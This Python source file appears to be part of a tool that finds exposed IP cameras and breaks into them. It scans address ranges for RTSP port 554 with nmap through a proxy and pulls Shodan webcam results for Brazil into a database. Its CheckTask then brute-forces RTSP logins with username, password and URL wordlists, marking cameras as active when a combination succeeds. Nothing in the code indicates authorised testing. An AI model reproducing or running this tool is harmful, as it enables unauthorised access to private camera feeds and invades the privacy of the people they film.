import itertools
import logging
import random
from abc import ABC, abstractmethod
from typing import Dict

import nmap
import shodan
from pydantic import BaseModel, ConfigDict, Field
from shodan import APIError

from models.camera import Camera
from models.managers import CameraRepository
from scanners.config import CheckersConfig, NmapConfig, ShodanConfig
from scanners.proxy import TwoCaptchaProxy
from scanners.rtsp_probe import RtspProbe, RtspTarget

__version__ = "0.1.0"


class _Location(BaseModel):
    model_config = ConfigDict(extra="ignore")

    city: str | None = None
    country_code: str | None = None
    country_name: str | None = None
    region_code: str | None = None


class ShodanBanner(BaseModel):
    """The subset of a Shodan search banner this scanner cares about."""

    model_config = ConfigDict(extra="ignore")

    ip_str: str
    port: int
    location: _Location = Field(default_factory=_Location)


class Task(ABC):
    """Base task: holds a validated config model and a camera repository."""

    def __init__(self, config: BaseModel, repository: CameraRepository = None):
        if config is None:
            raise ValueError("Config is required")
        self.config = config
        self.repository = repository or CameraRepository()

    @abstractmethod
    def run(self) -> None:
        raise NotImplementedError("You must implement the run method")


class NmapTask(Task):
    """Scan a network range with nmap and store the hosts that answer on RTSP."""

    def __init__(
        self,
        config: NmapConfig,
        proxy: TwoCaptchaProxy,
        repository: CameraRepository = None,
    ):
        super().__init__(config, repository)
        self.proxy = proxy
        self.scanner = nmap.PortScanner()

    def run(self) -> None:
        logging.info(f"Starting nmap scanning on {self.config.ip_range}")

        hosts = self._scan(self.config.ip_range)
        logging.info(f"Found {len(hosts)} hosts using nmap scan")

        for host, host_data in hosts.items():
            for port in host_data["tcp"]:
                self.repository.insert_camera(Camera(ip=host, port=port))
                logging.debug(f"Added on db {host}:{port}")
        logging.info("Executors: finished nmap scan")

    def _scan(self, target: str) -> Dict:
        response = self.scanner.scan(
            hosts=target, arguments=f"-p 554 -sV --proxies {self.proxy.url()}"
        )
        return response.get("scan")


class ShodanTask(Task):
    """Search Shodan for cameras and store the new ones in the database."""

    config: ShodanConfig

    def run(self) -> None:
        api = shodan.Shodan(self.config.shodan_key)
        query = "screenshot.label:webcam,cam country:BR"
        logging.info("Updating database")

        cams_added = 0
        try:
            for raw in api.search_cursor(query):
                banner = ShodanBanner(**raw)
                if self.repository.find(banner.ip_str, banner.port):
                    continue
                self.repository.insert_camera(
                    Camera(
                        ip=banner.ip_str,
                        port=banner.port,
                        city=banner.location.city,
                        country_code=banner.location.country_code,
                        country_name=banner.location.country_name,
                        region_code=banner.location.region_code,
                    )
                )
                logging.debug(f"{banner.ip_str}:{banner.port} added")
                cams_added += 1
            logging.info(f"{cams_added} cameras added")
        except APIError as e:
            logging.error(f"Shodan api error: {e}")
        except Exception as e:
            logging.error(f"Error: {e}")


class CheckTask(Task):
    """Try RTSP credential combinations against inactive cameras in the database."""

    def __init__(
        self,
        config: CheckersConfig,
        repository: CameraRepository = None,
        probe: RtspProbe = None,
    ):
        super().__init__(config, repository)
        self.probe = probe or RtspProbe()

    def run(self) -> None:
        logging.info("Starting check task")
        users = self._read_lines(self.config.wordlist_users)
        passwords = self._read_lines(self.config.wordlist_passwords)
        rtsp_urls = self._read_lines(self.config.wordlist_rtsp_urls)

        if self.config.randomize:
            random.shuffle(users)
            random.shuffle(passwords)
            random.shuffle(rtsp_urls)

        cameras = self.repository.get_random_inactive()
        logging.debug(f"Testing {len(cameras)} cameras")

        combinations = itertools.product(rtsp_urls, users, passwords, cameras)
        for url_template, user, password, camera in combinations:
            target = RtspTarget(
                host=camera.ip,
                port=camera.port,
                user=user,
                password=password,
                url_template=url_template,
            )
            found = self.probe.probe(target)
            if found:
                self.repository.set_active(found)
        logging.info("Executors: finished testing cameras")

    @staticmethod
    def _read_lines(path):
        with open(path, "r") as f:
            return f.read().splitlines()
